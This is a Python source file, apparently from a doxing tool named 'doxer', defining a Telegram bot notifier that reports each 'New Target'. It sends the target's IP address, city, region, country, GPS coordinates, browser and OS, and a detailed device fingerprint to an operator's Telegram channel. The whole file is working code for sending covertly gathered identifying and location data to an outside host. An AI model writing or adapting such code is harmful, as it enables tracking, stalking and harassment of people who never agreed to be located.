import logging

from aiogram import Bot
from aiogram.enums import ParseMode

from doxer.domain.entities import UserData
from doxer.domain.ports import NotificationServiceProtocol
from doxer.infrastructure.config import Telegram as TelegramSettings


class TelegramNotifier(NotificationServiceProtocol):

    def __init__(self, settings: TelegramSettings) -> None:
        self._bot = Bot(token=settings.bot_token)
        self._channel_id = settings.channel_id

    async def send_notification(self, user_data: UserData) -> None:
        try:
            message = self._format_message(user_data)
            await self._bot.send_message(
                chat_id=self._channel_id,
                text=message,
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logging.error(f"Failed to send Telegram notification: {e}", exc_info=True)

    def _format_message(self, user_data: UserData) -> str:
        lines = [
            "<b>New Target</b>\n",
        ]
        if user_data.link_name:
            lines.append(f"<b>Link Name:</b> {user_data.link_name}")

        lines.extend([
            f"<b>IP:</b> {user_data.ip_address}",
            "\n<b>Browser Info:</b>",
            f"Browser: {user_data.browser_data.browser}",
            f"OS: {user_data.browser_data.os}",
        ])

        if user_data.browser_data.device != "Other":
            lines.append(f"Device: {user_data.browser_data.device}")

        location_parts = []
        if user_data.location_data.city != "N/A":
            location_parts.append(user_data.location_data.city)
        if user_data.location_data.region != "N/A":
            location_parts.append(user_data.location_data.region)
        if user_data.location_data.country != "N/A":
            location_parts.append(user_data.location_data.country)

        if location_parts:
            lines.extend([
                "\n<b>Location:</b>",
                f"{', '.join(location_parts)}",
            ])

            if user_data.location_data.latitude is not None and user_data.location_data.longitude is not None:
                lines.append(
                    f"Coordinates: {user_data.location_data.latitude}, {user_data.location_data.longitude}"
                )

        lines.extend([
            "\n<b>System Info:</b>",
            f"Screen: {user_data.js_data.screen_resolution}",
            f"Color Depth: {user_data.js_data.color_depth}",
            f"Time Zone: {user_data.js_data.time_zone}",
            f"Language: {user_data.js_data.language}",
            f"Platform: {user_data.js_data.platform}",
            f"Network: {user_data.js_data.network_type}",
            f"Battery: {user_data.js_data.battery_status}",
            f"Memory: {user_data.js_data.device_memory}",
            f"Processors: {user_data.js_data.logical_processors}",
            f"Local Time: {user_data.js_data.local_datetime}",
            f"WebGL: {user_data.js_data.webgl_renderer}",
        ])

        return "\n".join(lines)
